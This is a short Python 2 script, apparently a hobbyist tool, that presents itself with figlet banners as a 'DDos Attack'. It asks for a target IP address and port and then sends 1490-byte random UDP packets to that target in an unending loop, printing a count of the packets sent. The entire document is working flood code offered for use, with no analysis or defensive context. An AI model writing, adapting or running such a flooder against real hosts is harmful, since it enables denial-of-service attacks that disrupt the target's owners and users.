import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
ip = raw_input("IP Target: ")
port = input("Port: ")

os.system("clear")
os.system("figlet Attack Starting")
sent = 0
ret = 1;
while ret > 0:
    ret = sock.sendto(bytes, (ip,port))
    print ("ret", ret)
    sent = sent + 1
    print ("Sent ", sent, "packet to ", ip, "throught port: ", port)
